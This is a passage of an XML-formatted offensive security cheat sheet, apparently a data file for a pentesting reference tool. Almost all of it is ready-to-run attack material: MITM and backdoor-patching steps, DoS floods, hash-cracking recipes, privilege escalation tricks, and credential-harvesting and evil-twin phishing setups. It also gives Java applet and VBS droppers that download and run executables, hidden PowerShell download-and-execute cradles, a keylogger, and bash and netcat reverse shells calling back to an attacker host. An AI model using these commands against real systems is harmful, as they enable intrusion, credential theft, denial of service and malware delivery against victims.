    iptables -t nat -A PREROUTING -i [interface] -p tcp --dport 5222 -j REDIRECT --to-ports 8080   # WhatsApp
    
3) Usage:
    mitmproxy -T --host
    
4) Direct target to mitm.it to install certificate

CAUTION: If the certificate is not trusted or installed on the target, they will be warned of an attack.

5) To manipulate traffic:
    i [filter]      hold traffic matching filter (* for all)
    a               release a flow
    A               release all flows
    e               edit flow
    w               save flows
    q, y            exit

Cleanup:
    sysctl -w net.ipv4.ip_forward=0
    iptables -t nat -F</info>
        </option>
        <option name="MITM Backdoor Patch">
            <info>When acting as a man in the middle, patch unencrypted downloaded files with a backdoor.
            
1) Route target traffic through attacker (e.g. ARP Spoof)
    arpspoof -i [interface] -t [target] -r [default gateway]

2) Set up port forwarding
    sysctl -w net.ipv4.ip_forward=1
    iptables -t nat -F
    iptables -t nat -A PREROUTING -i [interface] -p tcp --dport 80 -j REDIRECT --to-port 8080

3) Modify bdfproxy config file:
    proxyMode = transparent
    HOST = [attacker ip] (for each)
    
4) Start bdfproxy
    bdfproxy
    
5) Run Metasploit resource file
    msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc
    
Cleanup:
    sysctl -w net.ipv4.ip_forward=0
    iptables -t nat -F</info>
        </option>
        <option name="Printer (JetDirect) - Print Something">
            <info>Most Jet Direct network printers hold an open port on 9100/tcp and try to read data as a print job.  Telnet to the printer ip through that port, and whatever data is sent the printer should try to print.

Usage:
    telnet [ip address] [port]

Example:
    &gt; telnet 192.168.1.2 9100
        Trying 192.168.1.2...
        Connected to 192.168.1.2.
        Escape character is '^]'.
            hello printer
            ^]
        telnet> quit
        Connection closed.</info>
            
        </option>
        <option name="Printer (Ricoh) - Print Something">
            <info>Most Ricoh Savin network printers hold an open port on 514/tcp, which can be used to execute commands remotely.
                
Usage:
    rsh [ip address] print
    &gt; [text to print]</info>
            
        </option>
    </area>
    <area name="Crack Hashes">
        <option name="Identify Hash type">
            <info>Identify the type of hashing algorithm used.
                
Usage:
    hash-identifier
    &gt; [hash]</info>
            
        </option>
        <option name="Dictionary Attack">
            <info>Attempt to crack a list of hashes by trying every word in a wordlist.
                
Usage:
    hashcat -m [hash type] -a 0 -o [output file] --outfile-format=3 [hash file] [wordlist]</info>
            
        </option>
        <option name="Dictionary Attack + Rules">
            <info>Attempt to crack a list of hashes by trying every word in a wordlist and its alterations, according to a set of rules.  Note, this is word by word, no combinations.
            
Usage:
     hashcat -m [hash type] -a 0 -o [output file] --outfile-format=3 [hash file] [wordlist] -r [rules file]
     
     
Built-in Rules:
-----------------------

Insert Year:
    ... -r /usr/share/hashcat/rules/T0XlC-insert_00-99_1950-2050_toprules_0_F.rule

Quick:
    ... -r /usr/share/hashcat/rules/best64.rule

Weak:
    ... -r /usr/share/hashcat/rules/generated.rule

Solid:
    ... -r /usr/share/hashcat/rules/rockyou-30000.rule
    
Intense:
    ... -r /usr/share/hashcat/rules/d3ad0ne.rule
    
Epic:
    ... -r /usr/share/hashcat/rules/dive.rule
    
Random:
    ... -g [number of rules]</info>
            
        </option>
        <option name="Brute Force Attack">
            <info>Attempt to crack a list of hashes by trying every possibility matching a certain mask or pattern.
                
Usage:
    hashcat -m [hash type] -a 3 -o [output file] --outfile-format=3 [hash file] [mask]
    
Built-in Character Sets:
    ?l = abcdefghijklmnopqrstuvwxyz
    ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
    ?d = 0123456789
    ?s =  !"#$%&amp;'()*+,-./:;&lt;=&gt;?@[]^_`{|}~
    ?a = ?l?u?d?s
    
Custom Character Sets
    -1
    -2
    -3
    -4
    
    
Masks
-----------------------
    
Traditional Brute Force: try every possible combination up to 4 digits.
    ... ?a?a?a?a --increment --increment-min 1 --increment-max 4
    
Digits only, length of 8:
    ... ?d?d?d?d?d?d?d?d
    
First character uppercase, last character number, length of 8:
    ... ?u?l?l?l?l?l?l?d
    
Word "test", plus 3 digits:
    ... test?d?d?d
    
Using a custom character set (e.g. Hex, length of 8):
    ... -1 ?dabcdefABCDEF ?1?1?1?1?1?1?1?1
    
Using a language character set (e.g. German, length of 8):
    ... -1 /usr/share/hashcat/charsets/standard/German/de_cp1252.hcchr ?1?1?1?1?1?1?1?1

Using a prioritizing mask file (line separated, each line of format: [?1,][?2,][?3,][?4,]mask):
    ... mask_file.hcmask
    
    where mask_file.hcmask contains:
        ?d?l,test?1?1?1
        abcdef,0123,ABC,789,?3?3?3?1?1?1?1?2?2?4?4?4?4
        company?d?d?d?d?d
        ?l?l?l?l?d?d?d?d?d?d</info>
            
        </option>
        <option name="Combination Attack">
            <info>Attempt to crack a list of hashes by trying every combination of words in a wordlist.
            
Usage (max N items each):
    hashcat -m [hash type] -a 8 -o [output file] --outfile-format=3 --elem-cnt-max=[N] [hash file] [wordlist]
    
* Recommendation: Perform combination beforehand to create wordlist, then do dictionary attack + rules.</info>
            
        </option>
        <option name="Permutation Attack">
            <info>Attempt to crack a list of hashes by trying every permutation of each word in a wordlist.
      
Usage:
    hashcat -m [hash type] -a 4 -o [output file] --outfile-format=3 [hash file] [wordlist]
    
* Recommendation: Perform permutation beforehand to create wordlist, then do dictionary attack + rules.</info>
            
        </option>
        <option name="Substitution Attack">
            <info>Attempt to crack a list of hashes by trying every word in a wordlist and every version of each word with common substitutions and toggles.
                
Usage:
    hashcat -m [hash type] -a 5 --table-file /usr/share/hashcat/tables/toggle_case_and_leet.table -o [output file] --outfile-format=3 [hash file] [wordlist]</info>
            
        </option>
    </area>
    
    <area name="Denial of Service">
        <option name="SYN Flood DOS">
            <info>Flood a target with a large volume of SYN packets.
                
Usage:
    hping3 -S --flood -V --rand-source [target address]</info>
            
        </option>
        <option name="Smurf Attack">
            <info>Flood a target with a large volume of spoofed broadcast ping messages.
                
Usage:
    hping3 --icmp --flood -a [target address] [broadcast address]</info>
            
        </option>
        <option name="LAND Attack">
            <info>Flood a target with spoofed packets with an open port as both the source and destination, causing the machine to reply to itself continuously.
                
Usage:
    hping3 -V -c 1000000 -d 120 -S -w 64 -p [open port] -s [open port] --flood --rand-source [target address]</info>
            
        </option>
        <option name="WEB SSL DOS">
            <info>Perform a denial of service attack on an https web service by abusing SSL Renegotiation functionality.
            
Usage:
    thc-ssl-dos [target] 443 --accept</info>
            
        </option>
        <option name="VPN Server DOS">
            <info>Perform a denial of service attack on a VPN Server.
                
Usage:
    ike-scan -A -t 1 --sourceip=[spoof ip] [target ip]</info>
        </option>
        <option name="Deauthenticate Client">
            <info>Continuously send deauthentication packets to a machine on a network.
                
Usage:
    aireplay-ng -0 0 -a [AP MAC address] -c [target MAC address] (-h [source MAC address]) [interface]</info>
            
        </option>
        <option name="Deauthenticate Broadcast">
            <info>Continuously send deauthentication packets over broadcast on a network.
                
Usage:
    aireplay-ng -0 0 -a [AP MAC Address] (-h [source MAC address]) [interface]</info>
            
        </option>
        <option name="Ban IP Address">
            <info>Add an entry to the arp table banning a certain IP address.
                
Usage:
    arp -s [target IP] 00-00-00-00-00-0a
    
Cleanup:
    arp -d [target IP]</info>
            
        </option>
    </area>
    <area name="Local - Windows">
        <option name="Change Default Gateway">
            <info>Change the default gateway of the target to route their traffic through you.  Helpful if you are on a switch and can't see all traffic or you want to do something with the traffic.
                
Usage:
    (temporary)
        route add 0.0.0.0 mask 0.0.0.0 [attacker ip address]
        
    (permanent)
        netsh int ip set address "Local Area Connection" address=[current target ip address] mask=255.255.255.0 gateway=[attacker ip address]</info>
        </option>
        <option name="Install SSL Certificate">
            <info>Install an SSL certificate as a trusted certificate, allowing an SSL MITM attack.
                
Usage:
    certutil -addstore "Root" [certificate]</info>
        </option>
        <option name="Set DNS Server">
            <info>Set the DNS server for the hosts's system.
                
Usage:
    netsh interface ip set dns local static [ip]</info>
        </option>
        <option name="Set Static IP Address">
            <info>Change the IP Address of the host system.
                
Usage:
    netsh interface ip set address local static [ip] [netmask] [gateway] [ID]
    
Cleanup (revert to DHCP):
    netsh interface ip set address local dhcp</info>
        </option>
        <option name="Enable RDP">
            <info>Enable the Remote Desktop Protocol.
                
Setup:
    netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
    REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer" /v fDenyTSConnections /t REG_DWORD /d 0 /f</info>
        </option>
        <option name="Disable Host Firewall">
            <info>Disable the host-based firewall.
                
Usage:
    netsh advfirewall set currentprofile state off
    netsh advfirewall set allprofiles state off</info>
        </option>
        <option name="Impersonate Token">
            <info>Impersonate a domain user currently running a process on the system.
                
Usage:
    meterpreter &gt; use incognito
    meterpreter &gt; list_tokens -u
    meterpreter &gt; impersonate_token [domain]\\[user]</info>
        </option>
        <option name="Uninstall Patch">
            <info>Uninstall a patch on the system.
                
Usage:
    Wusa.exe /uninstall /kb:[patch number]</info>
        </option>
        <option name="Schedule File to Run">
            <info>Schedule a file to run.
                
Usage:
    at [HH:MM] [file] [args]</info>
        </option>
        <option name="Schedule File to Run - Remote">
            <info>Schedule a file to run on a remote system (with domain access).
                
Usage:
    (check time)
        net time \\[remote server]
    (copy over file)
        copy [file] \\[remote server]\C$\[path]
    (schedule file execute)
        at \\[remote server] [HH:MM] [file] [args]</info>
        </option>
        <option name="Run File as User">
            <info>Run a file as a specified user.
                
Usage:
    runas /user:[user] "[file] [args]"</info>
        </option>
        <option name="Run File as User - Remote">
            <info>Run a file on a remote system as a specified user.
                
Usage:
    wmic /node:[target ip] /user:[domain]\[user] /password:[password] process call create "\\[target ip]\[share]\[file path]"</info>
        </option>
        <option name="PowerUp Automated Privilege Escalation">
            <info>Run an automated privilege escalation tool.
                
Usage (enumerate):
    powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks</info>
        </option>
        <option name="Run Keylogger">
            <info>Run a keylogger on the device.
                
Usage:
    powershell.exe -exec bypass IEX "(New-Object Net.WebClient).DownloadString('https://raw.github.com/cheetz/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1');Get-Keystrokes -LogPath [log location]"
(or)
    meterpreter &gt; keyscan_start
    ...
    meterpreter &gt; keyscan_dump
    meterpreter &gt; keyscan_stop</info>
        </option>
    </area>
    <area name="Local - Linux">
        <option name="Change Default Gateway">
            <info>Change the default gateway of the target to route their traffic through you.  Helpful if you are on a switch and can't see all traffic or you want to do something with the traffic.
                
Usage:
    route add default gw [attacker ip address] [interface]</info>
        </option>
        <option name="Install SSL Certificate">
            <info>Install an SSL certificate as a trusted certificate, allowing an SSL MITM attack.
                
Usage:
    cp [certificate] /usr/local/share/ca-certificates/[certificate]
    update-ca-certificates</info>
        </option>
        <option name="Set DNS Server">
            <info>Set the DNS server for the hosts's system.
                
Usage:
    echo "[nameserver] [ip addr]" > /etc/resolv.conf</info>
        </option>
        <option name="Allow TCP Port Out">
            <info>Allow outbound TCP traffic on a certain port.
                
Usage:
    iptables -A OUTPUT -o [interface] -p tcp --dport [port] -m state --state NEW,ESTABLISHED -j ACCEPT
    iptables -A INPUT -o [interface] -p tcp --sport [port] -m state --state ESTABLISHED -j ACCEPT</info>
        </option>
        <option name="Allow ICMP Ping Out">
            <info>Allow outbound ICMP traffic.
                
Usage:
    iptables -A OUTPUT -i [interface] -p icmp --icmp-type echo-request -j ACCEPT
    iptables -A INPUT -o [interface] -p icmp --icmp-type echo-reply -j ACCEPT</info>
        </option>
        <option name="Hijack tar wildcard">
            <info>If a script is running that runs the following vulnerable tar command, it can be hijacked into running arbitrary code.
            
Vulnerable Command:
    tar cfz backup.tar.gz *
    
Usage (in directory with backup.tar.gz):
    touch -- "--checkpoint=1"
    touch -- "--checkpoint-action=exec=sh shell.sh"
    echo "[payload]" > shell.sh
    echo "touch done" >> shell.sh
    
Upon running the vulnerable command, the payload should be run as the owner of the vulnerable script.</info>
        </option>
        <option name="TCPDump Privilege Escalation">
            <info>If TCPDump can be run as root, it can be used to escalate privileges.
            
Usage:
    echo -e "cp /bin/sh sh_suid\nchmod 7555 sh_suid" > tmpfile
    chmod +x tmpfile
    sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z ./tmpfile -Z root
    ./sh_suid</info>
        </option>
	<option name="MySQL Privilege Escalation">
		<info>If MySQL is running as root, exploit it using user-defined functions.

Usage:
	$ wget https://www.exploit-db.com/download/1518 -O /tmp/raptor_udf2.c
	$ cd /tmp
	$ gcc -g -c raptor_udf2.c
	$ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
	$ mysql -u root -p
	Enter password:
	mysql&gt; use mysql;
	mysql&gt; create table foo(line blob);
	mysql&gt; insert into foo values(load_file('/tmp/raptor_udf2.so'));
	mysql&gt; select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
	mysql&gt; create function do_system returns integers soname 'raptor_udf2.so'
	mysql&gt; select do_system('bash -i &gt;&amp; /dev/tcp/[return ip]/[return port] 0>&amp;1');</info>
	</option>
    </area>
    <area name="Local - Mac">
        <option name="Change Default Gateway">
            <info>Change the default gateway of the target to route their traffic through you.  Helpful if you are on a switch and can't see all traffic or you want to do something with the traffic.
                
Usage:
    route add default [attacker ip address]</info>
        </option>
        <option name="Install SSL Certificate">
            <info>Install an SSL certificate as a trusted certificate, allowing an SSL MITM attack.
                
Usage:
    security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain [certificate]</info>
        </option>
        <option name="Set DNS Server">
            <info>Set the DNS server for the hosts's system.
                
Usage:
    echo "[nameserver] [ip addr]" > /etc/resolv.conf</info>
        </option>
    </area>
</type>
<type name="Build">
    <area name="Social Engineering">
        <option name="Credential Harvesting Website">
            <info>Clone an existing website with a login form and host it.  Site is altered to forward to the real site after saving login credentials.
                
Note: Contents in /var/www/html will be overwritten
            
Usage:
    service apache2 start
    setoolkit
    set &gt; 1 (Social-Engineering Attacks)
    set &gt; 2 (Website Attack Vectors)
    set:webattack &gt; 3 (Credential Harvester Attack Method)
    set:webattack &gt; 2 (Site Cloner)
    set:webattack &gt; [host ip]
    set:webattack &gt; [site to clone]</info>
            
        </option>
        <option name="Tab Nabbing Website">
            <info>Clone an existing website or create your own.  Site is altered to wait until the user navigates away from the tab, then load.
            
Note: Contents in /var/www/html will be overwritten

Usage:
    service apache2 start
    setoolkit
    set &gt; 1 (Social-Engineering Attacks)
    set &gt; 2 (Website Attack Vectors)
    set:webattack &gt; 4 (Tabnabbing Attack Method)
    set:webattack &gt; 2 (Site Cloner)
    set:webattack &gt; [host ip]
    set:webattack &gt; [site to clone]</info>
            
        </option>
        <option name="Java Applet - Execute Command">
            <info>Build a malicious Java Applet that executes an arbitrary command and embed it into a web page for the victim to run.
                
1) Build Applet: Java.java
=========================================
import java.applet.*;
import java.awt.*;
import java.io.*;
public class Java.java extends Applet {
    public void init() {
        Process f;
        String cmd = "[Command]";
        try {
            f = Runtime.getRuntime().exec(cmd);
        } catch(IOException e) {
            e.printStackTrace();
        }
        Process s;
    }
}
=========================================
    
2) Compile Applet:
    javac Java.java
    echo "Permissions: all-permissions" > /root/manifest.txt
    jar cvfm Java.jar /root/manifest.txt Java.class

3) Sign Applet:
    keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123
    ...info...
    jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet

4) Embed Applet into HTML:
    &lt;applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"&gt;&lt;/applet&gt;</info>
        </option>
        <option name="Java Applet - Download and Execute File">
            <info>Build a malicious Java Applet that downloads and executes a file and embed it into a web page for the victim to run.
                
Build Applet: Java.java
=========================================
import java.applet.*; import java.awt.*; import java.io.*; import java.net.URL; import java.util.*;
/**
* Author: Offensive Security
* This Java applet will download a file and execute it. **/

public class Java extends Applet {
private Object initialized = null; public Object isInitialized() {return initialized;}
public void init() {
    Process f;
    try {
        String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
        String expath = tmpdir + "evil.exe";
        String exargs = "[Executable arguments (e.g. [return ip] [return port] -e cmd.exe)]";
        String download = "";
        download = getParameter("1");
        if (download.length() > 0) { // URL parameter
            URL url = new URL(download);
            // Get an input stream for reading
            InputStream in = url.openStream();
            // Create a buffered input stream for efficency
            BufferedInputStream bufIn = new BufferedInputStream(in);
            File outputFile = new File(expath);
            OutputStream out = new BufferedOutputStream(new
            FileOutputStream(outputFile));
            byte[] buffer = new byte[2048];
            for (;;) {
                int nBytes = bufIn.read(buffer);
                if (nBytes &lt;= 0) break;out.write(buffer, 0, nBytes);
            }
            out.flush(); out.close(); in.close();
            f = Runtime.getRuntime().exec("cmd.exe /c " + expath + exargs);
        }
    } catch(IOException e) {e.printStackTrace();}
    /* ended here and commented out below for bypass */
    catch (Exception exception) {exception.printStackTrace();}
}
}
=========================================

2) Compile Applet:
    javac Java.java
    echo "Permissions: all-permissions" > /root/manifest.txt
    jar cvfm Java.jar /root/manifest.txt Java.class
    
3) Sign Applet:
    keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123
    ...info...
    jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet
    
4) Embed Applet into HTML:
    &lt;applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"&gt;&lt;param name="1" value="http://[host ip]/[host file]"&gt;&lt;/applet&gt;</info>
        </option>
        <option name="Malicious PDF">
            <info>Backdoor a meterpreter shell into a malicious pdf.

Backdoor into pdf:
    msfconsole -r &lt;(echo '
        use exploit/windows/fileformat/adobe_pdf_embedded_exe
        set PAYLOAD windows/meterpreter/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        set FILENAME [output file name]
        set INFILENAME [input pdf]
        run') --quiet
        
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD windows/meterpreter/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run') --quiet</info>
        </option>
        <option name="TODO: Infectious Media - Autorun">
            <info></info>
            
        </option>
        <option name="TODO: Infectious Media - Arduino Keyboard">
            <info></info>
            
        </option>
        <option name="Wireless Access Point">
            <info>Build a WiFi access point.
            
Assumed Scenario: Connect to internet with eth0, setup wifi on wlan0.

1) Connect to internet on eth0

2) Configure DNS/DHCP service
    apt-get install dnsmasq
    echo "
        interface=wlan0
        dhcp-range=10.0.0.10,10.0.0.250,12h
        dhcp-option=3,10.0.0.1
        dhcp-option=6,10.0.0.1
        server=8.8.8.8
        log-queries
        log-dhcp" &gt; /etc/dnsmasq.conf
    echo "
        [evil ip] [spoofed domain] " &gt; /etc/fakehosts.conf
    dnsmasq -C /etc/dnsmasq.conf -H /etc/fakehosts.conf -d
    
3) Configure AP service
    apt-get install hostapd
    echo "
        interface=wlan0
        driver=nl80211
        ssid=[SSID]
        hw_mode=g
        channel=1
        
        macaddr_acl=0
        ignore_broadcast_ssid=0
        
        auth_algs=1
        wpa=2
        wpa_passphrase=[PASSWORD]
        wpa_key_mgmt=WPA-PSK
        wpa_pairwise=TKIP
        rsn_pairwise=CCMP " &gt; /etc/hostapd/hostapd.conf
    hostapd /etc/hostapd/hostapd.conf
    
4) Configure routing
    sysctl -w net.ipv4.ip_forward=1
    iptables -P FORWARD ACCEPT
    iptables --table nat -A POSTROUTING -o eth0 -j MASQUERADE</info>
        </option>
        <option name="Bootable Wireless Access Point">
            <info>Build a WiFi access point that starts at boot.
            
Assumed Scenario: Connect to internet with eth0, setup wifi on wlan0.

1) Connect to internet on eth0

2) Configure DNS/DHCP service
    apt-get install dnsmasq
    echo "
        interface=wlan0
        dhcp-range=10.0.0.10,10.0.0.250,12h
        dhcp-option=3,10.0.0.1
        dhcp-option=6,10.0.0.1
        server=8.8.8.8
        log-queries
        log-dhcp" &gt; /etc/dnsmasq.conf

3) Configure AP service
    apt-get install hostapd
    echo "
        interface=wlan0
        driver=nl80211
        ssid=[SSID]
        hw_mode=g
        channel=1

        macaddr_acl=0
        ignore_broadcast_ssid=0

        auth_algs=1
        wpa=2
        wpa_passphrase=[PASSWORD]
        wpa_key_mgmt=WPA-PSK
        wpa_pairwise=TKIP
        rsn_pairwise=CCMP " &gt; /etc/hostapd/hostapd.conf
    chmod 540 /etc/hostapd/hostapd.conf
    
4) Configure routing
    echo "
        /sbin/sysctl -w net.ipv4.ip_forward=1
        /sbin/iptables -P FORWARD ACCEPT
        /sbin/iptables --table nat -A POSTROUTING -o eth0 -j MASQUERADE " &gt; /etc/init.d/CUSTOM_port-fwd-on.sh
    
5) Configure interface
    echo "
        auto wlan0
        iface wlan0 inet static
        address 10.0.0.1
        network 10.0.0.0
        netmask 255.255.255.0
        gateway 10.0.0.1 " &gt;&gt; /etc/network/interfaces

6) Set to run at boot
    update-rc.d dnsmasq defaults
    sed -i 's/DAEMON_CONF=/DAEMON_CONF=\/etc\/hostapd\/hostapd.conf/g' /etc/init.d/hostapd
    update-rc.d hostapd defaults
    update-rc.d CUSTOM_port-fwd-on.sh</info>
        </option>
	<option name="Wireless Access Point Phishing">
	<info>Create an Evil Twin wireless access point and conduct a phishing attack.
		
Install:
	git clone https://github.com/FluxionNetwork/fluxion.git
	./fluxion/install/install.sh
		
Run:
	./fluxion/fluxion</info>
	</option>
        <option name="TODO: QR-code">
            <info></info>
            
        </option>
        <option name="Send Mail">
            <info>Send an email.  Note, requires SMTP server.
      
Kali:
    sendEmail -t [to email address] -f [from email address] -s [smtp server] -u [subject] -m [message] -a [attachment file]
      
Linux:
    echo [message body] | mail -s [subject] [to address]
    
Windows:
    powershell.exe Send-MailMessage -to "[to address]" -from "[from address]" -subject "[subject]" -body "[message body]" -SmtpServer [Target Email Server IP]
            </info>
            
        </option>
    </area>
    <area name="Payload - Script">
        <option name="Ping Backdoor Beacon">
            <info>Start hping in listening mode on the target machine, waiting for a packet containing the specified signature.  Then send a packet with the signature to the machine on any open port, and any information following the signature will be excuted.
                
Start Beacon (on target):
    hping3 -I [interface] -9 [signature] | /bin/sh
    
Trigger beacon with telnet:
    telnet [target address] [open port]
    [signature] [command to execute]
    
Trigger beacon with web browser:
    curl http://[target address]:[open web port]/[signature][command to execute]</info>
            
        </option>
        <option name="Bash - Linux - Reverse Shell">
            <info>Build a reverse shell using Bash for a Linux machine.
         
32 bit
-----------------------

Listener:
    nc -l -p [return port]
(or)
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD linux/x86/shell/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')

Script:
    bash -i &gt;&amp; /dev/tcp/[return ip]/[return port] 0&gt;&amp;1
    
Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/reverse_bash LHOST=[return ip] LPORT=[return port] -f raw


64 bit
-----------------------

Listener:
    nc -l -p [return port]
(or)
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD linux/x64/shell/reverse_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Script:
    bash -i &gt;&amp; /dev/tcp/[return ip]/[return port]0&gt;&amp;1

Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/reverse_bash LHOST=[return ip] LPORT=[return port] -f raw</info>
        </option>
        <option name="Bash - OSX - Reverse Shell">
            <info>Build a reverse shell using Bash for an OSX machine.

32 bit
-----------------------

Listener:
    nc -l -p [return port]
(or)
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD osx/x86/shell_reverse_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Script:
    bash -i &gt;&amp; /dev/tcp/[return ip]/[return port] 0&gt;&amp;1
    
Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/reverse_bash LHOST=[return ip] LPORT=[return port] -f raw


64 bit
-----------------------

Listener:
    nc -l -p [return port]
(or)
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD osx/x64/shell_reverse_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Script:
    bash -i &gt;&amp; /dev/tcp/[return ip]/[return port] 0&gt;&amp;1
    
Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/reverse_bash LHOST=[return ip] LPORT=[return port] -f raw</info>
        </option>
	<option name="Bash - Download and Execute">
		<info>Download and execute a payload using wget.
Usage:
	wget [payload url] -O- | /bin/sh</info>
	</option>
        <option name="[FIX, no -z] Telnet - Linux - Reverse Shell with SSL">
            <info>Build an encrypted reverse shell using Bash and telnet with SSL for a Linux machine.
                
32 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD linux/x86/shell/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/reverse_bash_telnet_ssl LHOST=[return ip] LPORT=[return port] -f raw
    
64 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD linux/x64/shell/reverse_tcp_uuid
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/reverse_bash_telnet_ssl LHOST=[return ip] LPORT=[return port] -f raw</info>
        </option>
        <option name="[FIX, no -z] Telnet - OSX - Reverse Shell with SSL">
            <info>Build an encrypted reverse shell using Bash and telnet with SSL for an OSX machine.
                
32 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD osx/x86/shell_reverse_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/reverse_bash_telnet_ssl LHOST=[return ip] LPORT=[return port] -f raw
    

64 bit
-----------------------

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD osx/x64/shell_reverse_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Script:
    msfvenom -a cmd --platform unix -p cmd/unix/reverse_bash_telnet_ssl LHOST=[return ip] LPORT=[return port] -f raw</info>
        </option>
        <option name="VBS - Windows - Download and Execute">
            <info>Download and Execute a malicious file on a Windows machine with VBS.
        
Script:
    cmd.exe /c
    echo Const adTypeBinary = 1 > C:\windows\apsou.vbs &amp;
    echo Const adSaveCreateOverWrite = 2 >> C:\windows\apsou.vbs &amp;
    echo Dim BinaryStream >> C:\windows\apsou.vbs &amp;
    echo Set BinaryStream = CreateObject("ADODB.Stream") >> C:\windows\apsou.vbs &amp;
    echo BinaryStream.Type = adTypeBinary >> C:\windows\apsou.vbs &amp;
    echo BinaryStream.Open >> C:\windows\apsou.vbs &amp;
    echo BinaryStream.Write BinaryGetURL(Wscript.Arguments(0)) >> C:\windows\apsou.vbs &amp;
    echo BinaryStream.SaveToFile Wscript.Arguments(1), adSaveCreateOverWrite >> C:\windows\apsou.vbs &amp;
    echo Function BinaryGetURL(URL) >> C:\windows\apsou.vbs &amp;
    echo Dim Http >> C:\windows\apsou.vbs &amp;
    echo Set Http = CreateObject("WinHttp.WinHttpRequest.5.1") >> C:\windows\apsou.vbs &amp;
    echo Http.Open "GET", URL, False >> C:\windows\apsou.vbs &amp;
    echo Http.Send >> C:\windows\apsou.vbs &amp;
    echo BinaryGetURL = Http.ResponseBody >> C:\windows\apsou.vbs &amp;
    echo End Function >> C:\windows\apsou.vbs &amp;
    echo Set shell = CreateObject("WScript.Shell") >> C:\windows\apsou.vbs &amp;
    echo shell.Run "C:\windows\update.exe" >> C:\windows\apsou.vbs &amp;
    start C:\windows\apsou.vbs http://[host ip]/my.exe C:\windows\update.exe</info>
        </option>
        <option name="Powershell - Windows - Reverse Shell">
            <info>Execute a reverse shell on a Windows machine with Powershell.

Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/windows/reverse_powershell
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Script:
    msfvenom -a cmd --platform windows -p cmd/windows/reverse_powershell LHOST=[return ip] LPORT=[return port] -f raw</info>
        </option>
        <option name="Powershell - Windows - Reverse Powershell">
            <info>Execute a reverse Powershell shell on a Windows machine with Powershell.
                
Listener:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/windows/powershell_reverse_tcp
        set LHOST [return ip]
        set LPORT [return port]
        run')
        
Build Script:
    msfvenom -a cmd --platform windows -p cmd/windows/powershell_reverse_tcp LHOST=[return ip] LPORT=[return port] -f raw</info>
        </option>
        <option name="Powershell - Windows - Bind Powershell">
            <info>Execute a bind Powershell shell on a Windows machine with Powershell.
            
Connector:
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/windows/powershell_bind_tcp
        set LPORT [listening port]
        set RHOST [target ip]
        run')
        
Build Script:
    msfvenom -a cmd --platform windows -p cmd/windows/powershell_bind_tcp LPORT=[listening port] -f raw</info>
        </option>
	<option name="Powershell - Windows - Download and Execute">
		<info>Download and execute a payload using Windows Powershell.
			
Usage (windows x86):
	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c `IEX ((new-object net.webclient).downloadString('[url]'))`
    
Usage(windows x64):
	C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c `IEX ((new-object net.webclient).downloadString('[url]'))`</info>
	</option>
        <option name="Netcat - Reverse Shell">
            <info>Build a reverse shell using Netcat.

Standard
-----------------------

Listener:
    nc -l -p [return port]
(or)
    msfconsole -r &lt;(echo '
        use exploit/multi/handler
        set PAYLOAD cmd/unix/reverse_netcat_gaping
        set LHOST [return ip]
        set LPORT [return port]
        run')

Script:
